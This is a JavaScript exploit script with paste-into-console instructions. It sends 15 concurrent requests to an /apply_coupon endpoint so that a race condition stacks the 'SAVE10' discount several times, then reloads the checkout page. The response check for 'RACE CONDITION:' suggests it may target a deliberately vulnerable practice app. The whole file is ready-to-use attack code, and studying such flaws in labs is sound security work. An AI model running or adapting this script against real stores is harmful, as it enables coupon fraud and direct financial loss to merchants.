/**
 * APPLY_COUPON RACE CONDITION EXPLOIT
 * ==================================
 * 
 * Instructions:
 * 1. Add items to cart 
 * 2. Go to checkout page
 * 3. Open Developer Tools (F12) → Console
 * 4. Paste this script and press Enter
 * 5. Watch multiple discounts get applied!
 * 6. Refresh the page to see stacked discount
 */

console.clear();
console.log("🚨 APPLY_COUPON RACE CONDITION EXPLOIT");
console.log("=====================================");

async function applyCouponRaceCondition() {
    const couponCode = 'SAVE10';
    const numRequests = 15;
    
    console.log(`🎯 Targeting: /apply_coupon endpoint`);
    console.log(`🏷️  Coupon: ${couponCode}`);
    console.log(`🔀 Concurrent requests: ${numRequests}`);
    console.log(`⏱️  Exploiting 300ms race condition window...`);
    
    // Function to send apply_coupon request
    async function sendApplyCoupon(id) {
        try {
            const response = await fetch('/apply_coupon', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: `coupon_code=${couponCode}`,
                credentials: 'same-origin'
            });
            
            const text = await response.text();
            const hasDiscount = text.includes('You save $');
            const hasRaceCondition = text.includes('RACE CONDITION:');
            
            console.log(`🎯 Request ${id}: HTTP ${response.status} ${hasDiscount ? '💰' : ''} ${hasRaceCondition ? '🚨' : ''}`);
            
            return {
                id: id,
                status: response.status,
                success: response.status === 200,
                hasDiscount: hasDiscount,
                hasRaceCondition: hasRaceCondition
            };
        } catch (error) {
            console.log(`❌ Request ${id}: ERROR - ${error.message}`);
            return { id: id, success: false, error: error.message };
        }
    }
    
    // Launch concurrent requests
    console.log(`🚀 Launching ${numRequests} concurrent apply_coupon requests...`);
    
    const promises = [];
    for (let i = 1; i <= numRequests; i++) {
        promises.push(sendApplyCoupon(i));
    }
    
    // Wait for all requests to complete
    const results = await Promise.all(promises);
    
    // Analyze results
    const successful = results.filter(r => r.success).length;
    const withDiscounts = results.filter(r => r.hasDiscount).length;
    const withRaceCondition = results.filter(r => r.hasRaceCondition).length;
    
    console.log(`\n📊 RACE CONDITION RESULTS:`);
    console.log(`   Successful requests: ${successful}/${numRequests}`);
    console.log(`   Requests with discount: ${withDiscounts}`);
    console.log(`   Requests showing race condition: ${withRaceCondition}`);
    
    if (withDiscounts > 1 || withRaceCondition > 0) {
        console.log(`🎉 RACE CONDITION EXPLOITED!`);
        console.log(`💰 Multiple discount applications detected!`);
        console.log(`🔄 Reloading page to see stacked discounts...`);
        
        setTimeout(() => {
            window.location.reload();
        }, 2000);
    } else if (withDiscounts === 1) {
        console.log(`⚠️  Only 1 discount applied - race condition didn't work`);
        console.log(`💡 Try running the script again or check timing`);
    } else {
        console.log(`❌ No discounts applied - check if coupon is valid`);
    }
}

// Start the exploit
applyCouponRaceCondition();
